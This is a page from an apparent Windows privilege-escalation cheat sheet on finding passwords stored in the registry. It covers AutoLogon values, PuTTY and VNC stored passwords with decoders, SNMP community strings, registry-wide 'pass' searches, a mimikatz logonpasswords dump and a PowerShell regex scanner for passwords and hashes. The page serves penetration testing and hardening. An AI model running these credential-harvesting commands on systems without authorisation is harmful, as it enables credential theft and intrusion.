# Password in Windows Registry

## To configure AutoLogon credentials on a Windows machine

### Method 1: Using Registry Editor (Manual)

1. Open Registry Editor  
    Press `Win + R`, type `regedit`, and hit Enter.

2. Navigate to:

    ```text
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    ```

3. Modify or Create the Following Entries:

    - `DefaultUserName` (REG_SZ) → Set to the username (e.g., `Administrator`)

    - `DefaultPassword` (REG_SZ) → Set to the password (e.g, `@rmour123`)

    - `AutoAdminLogon` (REG_SZ) → Set to `1`

4. Restart the Computer  

    - The system should log in automatically using the configured credentials.


### Method 2: Command Line (Quick Setup)

- Run these commands in Command Prompt (Admin):

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "Administrator" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "@rmour123" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "1" /f
```


### Method 3: PowerShell (Scripted Approach)

- Run this PowerShell script to configure AutoLogon:

```powershell
$Username = "Administrator"
$Password = "@rmour123"

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultUserName" -Value $Username
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword" -Value $Password
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "1"
```


### Security Warning

- Storing passwords in plaintext in the registry is insecure.

- If you must use AutoLogon, consider encrypting the password and using LSA Secrets.


### Disable AutoLogon

- To remove AutoLogon, run:

```cmd
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f
```

## AutoLogon Credentials

- Stores username and password for automatic login at startup.

### Registry Path:

```text
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

```cmd
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Commands to Query:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```

### Example Output:

```text
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultUserName    REG_SZ    Administrator
    DefaultPassword    REG_SZ    SuperSecret123!
    AutoAdminLogon     REG_SZ    1
```

- `AutoAdminLogon = 1` means auto-login is enabled.  

- If `DefaultPassword` is missing, it might be stored in LSA Secrets instead.


## PuTTY Stored Sessions

- PuTTY saves proxy credentials in the registry.

### Registry Path:

```text
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
```

### Commands to Query:

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\centos9 -v ProxyUsername
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\centos9 -v ProxyPassword
```

- Passwords might be encoded (Base64) but not encrypted. Decode with PowerShell:

```powershell
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UGFzc3dvcmQ="))
```


## TightVNC Stored Passwords

- TightVNC passwords are stored in the registry, often encoded using weak XOR-based encryption.

### Registry Path:

```text
HKEY_CURRENT_USER\Software\TightVNC\Server
```

### Commands to Query:

```cmd
reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v Password
reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v PasswordViewOnly
```

- You can decrypt them with `vncpwd.exe`:

```cmd
C:\Users\User\Desktop\Tools\vncpwd\vncpwd.exe
```


##  VNC Credentials (Encrypted)

- RealVNC and WinVNC store credentials in the registry.

### Registry Paths:

- WinVNC3:


```text
HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password
```

- RealVNC:


```text
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

### Commands to Query:

```cmd
reg query "HKCU\Software\ORL\WinVNC3" /v Password
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
```

- Use `vncpwd.exe` to decode VNC passwords:

```cmd
vncpwd.exe [Encrypted Password]
```


## SNMP Community Strings

- SNMP (Simple Network Management Protocol) can hold plaintext strings used for network access.

### Registry Path:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP
```

### Commands to Query:

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
```

- Might reveal community strings like `"public"` or `"private"`.


## Searching for Passwords in Registry

- You can search for passwords across the entire registry:

### Search Entire Registry for password (Local Machine):

```cmd
reg query "HKEY_LOCAL_MACHINE" /s | findstr /i "pass*"
```

### Search Entire Registry for password (Current User):

```cmd
reg query "HKEY_CURRENT_USER" /s | findstr /i "pass*"
```


## Fault Tolerant Heap (FTH) Rules

- `FTH` stores compatibility fixes for applications, which sometimes include sensitive info.

### Registry Path:

```text
HKEY_LOCAL_MACHINE\Software\Microsoft\FTH
```

### Command to Query:

```cmd
reg query "HKLM\Software\Microsoft\FTH" /V RuleList
```


## Pro Tips:

### Extract LSA Secrets (if passwords are missing):  

- Use `mimikatz` to extract LSA secrets:

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### Extract VNC Password from Registry (Directly):  

- Use this PowerShell one-liner:

```powershell
(Get-ItemProperty -Path 'HKCU:\Software\ORL\WinVNC3').Password
```

### Decrypt TightVNC Password:  

- Extract from registry and decode with Python:

```python3
import base64
key = 'tightvnc'
enc = b'PASSWORD_HEX'
dec = bytes([a ^ b for a, b in zip(enc, key * (len(enc) // len(key) + 1))])
print(dec.decode('utf-8'))
```

### PowerShell script to include the regex patterns for detecting passwords and hashes in the registry

```powershell
Write-Host -ForegroundColor Blue "=========|| Registry Password Check ||========="
Write-Host "Searching for possible passwords in the registry... This may take some time."

$regexSearch = @{
    "Simple Passwords1" = "pass[^a-zA-Z]?.*"
    "Simple Passwords2" = "password[^a-zA-Z]?.*"
    "Simple Passwords3" = "pwd[^a-zA-Z]?.*"
    "Apr1 MD5" = '\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}'
    "Apache SHA" = "\{SHA\}[0-9a-zA-Z/_=]{10,}"
    "Blowfish" = '\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*'
    "Drupal" = '\$S\$[a-zA-Z0-9_/\.]{52}'
    "Joomlavbulletin" = "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}"
    "Linux MD5" = '\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}'
    "phpbb3" = '\$H\$[a-zA-Z0-9_/\.]{31}'
    "sha512crypt" = '\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}'
    "Wordpress" = '\$P\$[a-zA-Z0-9_/\.]{31}'
    "md5" = "(^|[^a-zA-Z0-9])[a-fA-F0-9]{32}([^a-zA-Z0-9]|$)"
    "sha1" = "(^|[^a-zA-Z0-9])[a-fA-F0-9]{40}([^a-zA-Z0-9]|$)"
    "sha256" = "(^|[^a-zA-Z0-9])[a-fA-F0-9]{64}([^a-zA-Z0-9]|$)"
    "sha512" = "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)"
    "Base64" = "(eyJ|YTo|Tzo|PD[89]|aHR0cHM6L|aHR0cDo|rO0)[a-zA-Z0-9+/]+={0,2}"
}

$regPath = "HKCU:\"

Get-ChildItem -Path $regPath -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    $Name = $_.Name
    $properties = $_.Property

    foreach ($Prop in $properties) {
        $propValue = (Get-ItemProperty -Path $_.PSPath -Name $Prop -ErrorAction SilentlyContinue).$Prop

        foreach ($pattern in $regexSearch.GetEnumerator()) {
            if ($Prop -match $pattern.Value -or $propValue -match $pattern.Value) {
                Write-Host "[$($pattern.Key)] Possible Match Found: $Name\$Prop" -ForegroundColor Green
                Write-Host "Value: $propValue" -ForegroundColor Cyan
            }
        }
    }
}

Write-Host "===========|| Scan Complete ||===========" -ForegroundColor Blue
```

## Related
- [Password Mining](Password-Mining.md) — parent hub
- [Registry Exploitation Techniques](../Registry-Exploitation/Registry-Exploitation-Techniques.md) — registry attack surface
- [Extracting Passwords Stored in Services](Extracting-Passwords-Stored-in-Services.md) — service creds in the registry
- [Windows Privilege Escalation](../README.md) — escalation context
